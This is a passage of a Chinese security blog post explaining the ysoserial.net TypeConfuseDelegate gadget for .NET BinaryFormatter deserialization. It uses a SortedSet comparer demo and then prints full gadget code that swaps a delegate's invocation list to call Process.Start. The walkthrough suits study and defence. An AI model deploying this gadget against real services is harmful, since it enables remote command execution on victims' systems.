+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Collections</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Collections.Generic</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nn">BinaryFormatterSerialize</span>  
+</span></span><span class="line"><span class="cl"><span class="p">{</span>  
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="k">class</span> <span class="nc">ByFileExtension</span> <span class="p">:</span> <span class="n">IComparer</span><span class="p">&lt;</span><span class="kt">string</span><span class="p">&gt;</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">        <span class="kt">string</span> <span class="n">xExt</span><span class="p">,</span> <span class="n">yExt</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">        <span class="n">CaseInsensitiveComparer</span> <span class="n">caseiComp</span> <span class="p">=</span> <span class="k">new</span> <span class="n">CaseInsensitiveComparer</span><span class="p">();</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="kt">int</span> <span class="n">Compare</span><span class="p">(</span><span class="kt">string</span> <span class="n">x</span><span class="p">,</span> <span class="kt">string</span> <span class="n">y</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">            <span class="c1">// Parse the extension from the file name.  </span>
+</span></span><span class="line"><span class="cl">            <span class="n">xExt</span> <span class="p">=</span> <span class="n">x</span><span class="p">.</span><span class="n">Substring</span><span class="p">(</span><span class="n">x</span><span class="p">.</span><span class="n">LastIndexOf</span><span class="p">(</span><span class="s">&#34;.&#34;</span><span class="p">)</span> <span class="p">+</span> <span class="m">1</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">yExt</span> <span class="p">=</span> <span class="n">y</span><span class="p">.</span><span class="n">Substring</span><span class="p">(</span><span class="n">y</span><span class="p">.</span><span class="n">LastIndexOf</span><span class="p">(</span><span class="s">&#34;.&#34;</span><span class="p">)</span> <span class="p">+</span> <span class="m">1</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">            <span class="c1">// Compare the file extensions.  </span>
+</span></span><span class="line"><span class="cl">            <span class="kt">int</span> <span class="n">vExt</span> <span class="p">=</span> <span class="n">caseiComp</span><span class="p">.</span><span class="n">Compare</span><span class="p">(</span><span class="n">xExt</span><span class="p">,</span> <span class="n">yExt</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">vExt</span> <span class="p">!=</span> <span class="m">0</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">            <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">vExt</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>  
+</span></span><span class="line"><span class="cl">            <span class="k">else</span>  
+</span></span><span class="line"><span class="cl">            <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">                <span class="c1">// The extension is the same,  </span>
+</span></span><span class="line"><span class="cl">                <span class="c1">// so compare the filenames.  </span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">caseiComp</span><span class="p">.</span><span class="n">Compare</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>  
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>  
+</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">Program</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="kd">static</span> <span class="k">void</span> <span class="n">Main</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">            <span class="kt">var</span> <span class="k">set</span> <span class="p">=</span> <span class="k">new</span> <span class="n">SortedSet</span><span class="p">&lt;</span><span class="kt">string</span><span class="p">&gt;(</span><span class="k">new</span> <span class="n">ByFileExtension</span><span class="p">());</span>  
+</span></span><span class="line"><span class="cl">            <span class="k">set</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="s">&#34;test.c&#34;</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">            <span class="k">set</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="s">&#34;test.b&#34;</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">            <span class="k">set</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="s">&#34;test.a&#34;</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">            <span class="k">foreach</span> <span class="p">(</span><span class="kt">var</span> <span class="n">item</span> <span class="k">in</span> <span class="k">set</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">            <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">                <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="n">item</span><span class="p">.</span><span class="n">ToString</span><span class="p">());</span>  
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">Console</span><span class="p">.</span><span class="n">ReadKey</span><span class="p">();</span>  
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>  
+</span></span><span class="line"><span class="cl"><span class="p">}</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="c1">// 输出  </span>
+</span></span><span class="line"><span class="cl"><span class="n">test</span><span class="p">.</span><span class="n">a</span>  
+</span></span><span class="line"><span class="cl"><span class="n">test</span><span class="p">.</span><span class="n">b</span>  
+</span></span><span class="line"><span class="cl"><span class="n">test</span><span class="p">.</span><span class="n">c</span>  </span></span></code></pre></td></tr></table>
+</div>
+</div><p>向<code>set</code>集合中添加<code>test.c</code>、<code>test.b</code>、<code>test.a</code>按照后缀会被自动排序。自动排序的前提是必须要有两个以上的元素，即第二次添加的时候才会自动排序。<br>
+其中<code>ByFileExtension</code>比较器，实现了<code>IComparer&lt;string&gt;</code>接口，重写了<code>Compare()</code>方法，返回<code>int</code>值。</p>
+<h4 id="ysoserialnet-gadget" class="heading-element"><span>Ysoserial.net Gadget</span>
+  <a href="#ysoserialnet-gadget" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="line"><span class="cl"><span class="n">Delegate</span> <span class="n">da</span> <span class="p">=</span> <span class="k">new</span> <span class="n">Comparison</span><span class="p">&lt;</span><span class="kt">string</span><span class="p">&gt;(</span><span class="n">String</span><span class="p">.</span><span class="n">Compare</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl"><span class="n">Comparison</span><span class="p">&lt;</span><span class="kt">string</span><span class="p">&gt;</span> <span class="n">d</span> <span class="p">=</span> <span class="p">(</span><span class="n">Comparison</span><span class="p">&lt;</span><span class="kt">string</span><span class="p">&gt;)</span><span class="n">MulticastDelegate</span><span class="p">.</span><span class="n">Combine</span><span class="p">(</span><span class="n">da</span><span class="p">,</span> <span class="n">da</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl"><span class="n">IComparer</span><span class="p">&lt;</span><span class="kt">string</span><span class="p">&gt;</span> <span class="n">comp</span> <span class="p">=</span> <span class="n">Comparer</span><span class="p">&lt;</span><span class="kt">string</span><span class="p">&gt;.</span><span class="n">Create</span><span class="p">(</span><span class="n">d</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl"><span class="n">SortedSet</span><span class="p">&lt;</span><span class="kt">string</span><span class="p">&gt;</span> <span class="k">set</span> <span class="p">=</span> <span class="k">new</span> <span class="n">SortedSet</span><span class="p">&lt;</span><span class="kt">string</span><span class="p">&gt;(</span><span class="n">comp</span><span class="p">);</span>  </span></span></code></pre></td></tr></table>
+</div>
+</div><p>其中存在一个<code>Comparer&lt;string&gt;.Create();</code>方法，<br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506091432274.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506091432274.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506091432274.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506091432274.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506091432274.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506091432274.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+实例化了一个<code>ComparisonComparer</code>类，他的参数是一个<code>Comparison&lt;T&gt;</code>泛型委托。<br>
+其中继承了<code>Comparer</code>抽象类，这个抽象类继承了<code>IComparer&lt;T&gt;</code>接口，重写了<code>compare</code>方法。<br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506091439936.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506091439936.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506091439936.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506091439936.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506091439936.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506091439936.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506091438425.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506091438425.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506091438425.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506091438425.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506091438425.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506091438425.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+重写的<code>compare()</code>方法中，其中执行了我们最开始传入的委托所代表的方法。<br>
+此时，我们再来看一下<code>Comparison&lt;T&gt;</code>泛型委托是什么？他能委托什么方法呢？<br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506091445424.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506091445424.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506091445424.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506091445424.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506091445424.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506091445424.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+它限制了传入的参数类型是<code>&lt;in T&gt;</code>，但是在<code>Ysoserial.net</code>中<code>Gadget</code>利用到了<code>Process.Start()</code>，他的重载方法中，只有两个<code>string</code>类型的函数<br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506091451861.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506091451861.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506091451861.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506091451861.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506091451861.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506091451861.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+刚才在上述的Demo中，有这样一句话<code>传递给委托的方法签名必须和定义的委托签名一致，就是返回值、参数一致。</code><br>
+那我们如何解决这个问题？传入两个<code>string</code>类型的参数呢？<br>
+这需要用到多播委托。<br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506091454874.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506091454874.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506091454874.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506091454874.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506091454874.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506091454874.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+传入一个<code>string</code>的比较器</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="line"><span class="cl"><span class="n">Delegate</span> <span class="n">da</span> <span class="p">=</span> <span class="k">new</span> <span class="n">Comparison</span><span class="p">&lt;</span><span class="kt">string</span><span class="p">&gt;(</span><span class="n">String</span><span class="p">.</span><span class="n">Compare</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl"><span class="n">Comparison</span><span class="p">&lt;</span><span class="kt">string</span><span class="p">&gt;</span> <span class="n">d</span> <span class="p">=</span> <span class="p">(</span><span class="n">Comparison</span><span class="p">&lt;</span><span class="kt">string</span><span class="p">&gt;)</span><span class="n">MulticastDelegate</span><span class="p">.</span><span class="n">Combine</span><span class="p">(</span><span class="n">da</span><span class="p">,</span> <span class="n">da</span><span class="p">);</span>  </span></span></code></pre></td></tr></table>
+</div>
+</div><p>为什么多播委托可以解决方法签名不一致的问题呢？<br>
+作者给出的解释</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">The only weird thing about this code is TypeConfuseDelegate. It’s a long standing issue that .NET delegates don’t always enforce their type signature, especially the return value. In this case we create a two entry multicast delegate (a delegate which will run multiple single delegates sequentially), setting one delegate to String::Compare which returns an int, and another to Process::Start which returns an instance of the Process class. This works, even when deserialized and invokes the two separate methods. It will then return the created process object as an integer, which just means it will return the pointer to the instance of the process object.  </span></span></code></pre></td></tr></table>
+</div>
+</div><p>最后的<code>Gadget</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="line"><span class="cl"> <span class="kd">public</span> <span class="kd">static</span> <span class="kt">object</span> <span class="n">TypeConfuseDelegateGadget</span><span class="p">(</span><span class="n">InputArgs</span> <span class="n">inputArgs</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl"> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">     <span class="kt">string</span> <span class="n">cmdFromFile</span> <span class="p">=</span> <span class="n">inputArgs</span><span class="p">.</span><span class="n">CmdFromFile</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">     <span class="k">if</span> <span class="p">(!</span><span class="kt">string</span><span class="p">.</span><span class="n">IsNullOrEmpty</span><span class="p">(</span><span class="n">cmdFromFile</span><span class="p">))</span>  
+</span></span><span class="line"><span class="cl">     <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">         <span class="n">inputArgs</span><span class="p">.</span><span class="n">Cmd</span> <span class="p">=</span> <span class="n">cmdFromFile</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">     <span class="p">}</span>  
+</span></span><span class="line"><span class="cl">       
+</span></span><span class="line"><span class="cl">     <span class="n">Delegate</span> <span class="n">da</span> <span class="p">=</span> <span class="k">new</span> <span class="n">Comparison</span><span class="p">&lt;</span><span class="kt">string</span><span class="p">&gt;(</span><span class="n">String</span><span class="p">.</span><span class="n">Compare</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">     <span class="n">Comparison</span><span class="p">&lt;</span><span class="kt">string</span><span class="p">&gt;</span> <span class="n">d</span> <span class="p">=</span> <span class="p">(</span><span class="n">Comparison</span><span class="p">&lt;</span><span class="kt">string</span><span class="p">&gt;)</span><span class="n">MulticastDelegate</span><span class="p">.</span><span class="n">Combine</span><span class="p">(</span><span class="n">da</span><span class="p">,</span> <span class="n">da</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">     <span class="n">IComparer</span><span class="p">&lt;</span><span class="kt">string</span><span class="p">&gt;</span> <span class="n">comp</span> <span class="p">=</span> <span class="n">Comparer</span><span class="p">&lt;</span><span class="kt">string</span><span class="p">&gt;.</span><span class="n">Create</span><span class="p">(</span><span class="n">d</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">     <span class="n">SortedSet</span><span class="p">&lt;</span><span class="kt">string</span><span class="p">&gt;</span> <span class="k">set</span> <span class="p">=</span> <span class="k">new</span> <span class="n">SortedSet</span><span class="p">&lt;</span><span class="kt">string</span><span class="p">&gt;(</span><span class="n">comp</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">     <span class="k">set</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="n">inputArgs</span><span class="p">.</span><span class="n">CmdFileName</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">     <span class="k">if</span> <span class="p">(</span><span class="n">inputArgs</span><span class="p">.</span><span class="n">HasArguments</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">     <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">         <span class="k">set</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="n">inputArgs</span><span class="p">.</span><span class="n">CmdArguments</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">     <span class="p">}</span>  
+</span></span><span class="line"><span class="cl">     <span class="k">else</span>  
+</span></span><span class="line"><span class="cl">     <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">         <span class="k">set</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="s">&#34;&#34;</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">     <span class="p">}</span>  
+</span></span><span class="line"><span class="cl">       
+</span></span><span class="line"><span class="cl">     <span class="n">FieldInfo</span> <span class="n">fi</span> <span class="p">=</span> <span class="k">typeof</span><span class="p">(</span><span class="n">MulticastDelegate</span><span class="p">).</span><span class="n">GetField</span><span class="p">(</span><span class="s">&#34;_invocationList&#34;</span><span class="p">,</span> <span class="n">BindingFlags</span><span class="p">.</span><span class="n">NonPublic</span> <span class="p">|</span> <span class="n">BindingFlags</span><span class="p">.</span><span class="n">Instance</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">     <span class="kt">object</span><span class="p">[]</span> <span class="n">invoke_list</span> <span class="p">=</span> <span class="n">d</span><span class="p">.</span><span class="n">GetInvocationList</span><span class="p">();</span>  
+</span></span><span class="line"><span class="cl">     <span class="c1">// Modify the invocation list to add Process::Start(string, string)  </span>
+</span></span><span class="line"><span class="cl">     <span class="n">invoke_list</span><span class="p">[</span><span class="m">1</span><span class="p">]</span> <span class="p">=</span> <span class="k">new</span> <span class="n">Func</span><span class="p">&lt;</span><span class="kt">string</span><span class="p">,</span> <span class="kt">string</span><span class="p">,</span> <span class="n">Process</span><span class="p">&gt;(</span><span class="n">Process</span><span class="p">.</span><span class="n">Start</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">     <span class="n">fi</span><span class="p">.</span><span class="n">SetValue</span><span class="p">(</span><span class="n">d</span><span class="p">,</span> <span class="n">invoke_list</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">     <span class="k">return</span> <span class="k">set</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"> <span class="p">}</span>  </span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506091526926.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506091526926.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506091526926.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506091526926.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506091526926.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506091526926.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="Updated on 2025-06-09 15:41:08">Updated on 2025-06-09&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://localhost:1313/dot-net-binaryformatter%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" data-title="Dot NET-BinaryFormatter反序列化漏洞"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+  </span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/binaryformatter/" class="post-tag" title="Tags - BinaryFormatter">BinaryFormatter</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div><div class="post-nav"><a href="/dot-net-.net-remoting%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="post-nav-item" rel="prev" title="Dot NET-.NET Remoting反序列化漏洞"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>Dot NET-.NET Remoting反序列化漏洞</a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content always-active" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered order-3">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.145.0"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.15"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2023 - 2025</span><span class="author" itemprop="copyrightHolder">
+              <a href="/"></a></span></div><div class="footer-line visitor order-1">
+          <span id="busuanzi_container_site_uv" title='Total visitors'><i class="fa-regular fa-user fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='Total visits'><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
+        </div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;bottom: 0;"></div><noscript>
+    <div class="noscript-warning">Theme FixIt works best with JavaScript enabled.</div>
+  </noscript>
